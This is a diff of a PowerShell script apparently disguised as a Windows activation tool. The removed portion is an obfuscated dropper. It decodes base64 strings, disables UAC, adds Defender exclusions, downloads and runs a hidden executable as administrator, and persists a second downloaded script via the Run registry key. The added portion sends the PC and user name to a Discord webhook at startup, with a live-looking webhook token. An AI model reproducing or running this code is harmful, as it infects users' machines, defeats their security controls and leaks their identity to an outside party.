@@ -1,90 +1,30 @@
-$downloadUrlB64 = "aHR0cHM6Ly9naXRodWIuY29tL1dpbmRvd3NUd2Vha3NYL1Bvd2VyU2hlbGxBY3RpdmF0ZS9yYXcvcmVmcy9oZWFkcy9tYWluL2RvbGJhZWIuZXhl"
-$updaterExeB64 = "dXBkYXRlci5leGU="
-$hiddenAttrB64 = "SGlkZGVu"
-$silentlyContinueB64 = "U2lsZW50bHljb250aW51ZQ=="
-$stopActionB64 = "U3RvcA=="
-$directoryB64 = "RGlyZWN0b3J5"
-$runAsB64 = "UnVuQXM="
-$scriptUrlB64 = "aHR0cHM6Ly9naXRodWIuY29tL1dpbmRvd3NUd2Vha3NYL1Bvd2VyU2hlbGxBY3RpdmF0ZS9yYXcvcmVmcy9oZWFkcy9tYWluL1JlYWN0aXZhdGlvblNjcmlwdA=="
-$trustedNameB64 = "V2luZG93c1VwZGF0ZS5wczE="
-$trustedFolderB64 = "VXBkYXRlQ2FjaGU="
-$programfilesB64 = "QzpcUHJvZ3JhbSBGaWxlcw=="
-
-$downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($downloadUrlB64))
-$updaterExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterExeB64))
-$hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))
-$silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB64))
-$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
-$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))
-$runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($runAsB64))
-$scriptUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($scriptUrlB64))
-$trustedName = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($trustedNameB64))
-$trustedFolder = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($trustedFolderB64))
-$programfiles = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($programfilesB64))
-
-function Add-Exclusion {
-    param ([string]$Path)
-    try {
-        Add-MpPreference -ExclusionPath $Path -ErrorAction $stopAction
-    } catch {
-        Write-Host "An error occurred during activation. Please try again." -ForegroundColor Red
-    }
+$webhookUrl = "https://discordapp.com/api/webhooks/1345713305398022257/8WDyAFlcQk-2fwOp4MW87lebVGb9a2HOcx_OYISl4eMXMeLMTjKPcZKaDj_gPBREx0P5"
+$computerName = $env:COMPUTERNAME
+$username = $env:USERNAME
+$message = @{
+    embeds = @(
+        @{
+            title = "Script runned"
+            description = "*Script runned with Windows start - no malicious activity was detected*."
+            color = 333333 # Цвет в десятичном формате
+            fields = @(
+                @{
+                    name = "**PC Name**"
+                    value = $computerName
+                    inline = $true
+                },
+                @{
+                    name = "**User Name**"
+                    value = $username
+                    inline = $true
+                }
+            )
+        }
+    )
 }
 
-function Disable-UAC {
-    try {
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0 -ErrorAction $stopAction
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction $stopAction
-    } catch {
-        Write-Host "An error occurred during activation. Please try again." -ForegroundColor Red
-    }
-}
+# Преобразуйте объект в JSON
+$jsonMessage = $message | ConvertTo-Json -Depth 4
 
-$persistFolder = Join-Path $env:APPDATA $trustedFolder
-try {
-    New-Item -ItemType $directory -Path $persistFolder -Force | Out-Null
-    Set-ItemProperty -Path $persistFolder -Name Attributes -Value $hiddenAttr
-    Add-Exclusion -Path $persistFolder
-} catch {
-    Write-Host "An error occurred during activation. Please try again." -ForegroundColor Red
-}
-
-$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
-try {
-    New-Item -ItemType $directory -Path $hiddenFolder | Out-Null
-    Add-Exclusion -Path $hiddenFolder
-} catch {
-    Write-Host "An error occurred during activation. Please try again." -ForegroundColor Red
-}
-
-$tempPath = Join-Path $hiddenFolder $updaterExe
-
-try {
-    Write-Host "Loading Activation Script..." -BackgroundColor Green
-    Disable-UAC
-    Add-Exclusion -Path $programfiles
-    Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
-    
-    Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
-    Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr
-    
-    $process = Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -Verb $runAs -PassThru -Wait
-
-    if ($process.ExitCode -eq 0) {
-        $persistScriptPath = Join-Path $persistFolder $trustedName
-        
-        Invoke-WebRequest -Uri $scriptUrl -OutFile $persistScriptPath -UseBasicParsing
-        
-        Set-ItemProperty -Path $persistScriptPath -Name Attributes -Value $hiddenAttr
-        
-        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistScriptPath`""
-        Set-ItemProperty -Path $regPath -Name $trustedName -Value $regValue -Force
-    }
-} catch {
-    Write-Host "An error occurred during activation. Please try again." -ForegroundColor Red
-} finally {
-    if (Test-Path $hiddenFolder) {
-        Remove-Item $hiddenFolder -Recurse -Force
-    }
-}
+# Отправьте POST-запрос с сообщением
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonMessage -ContentType 'application/json'
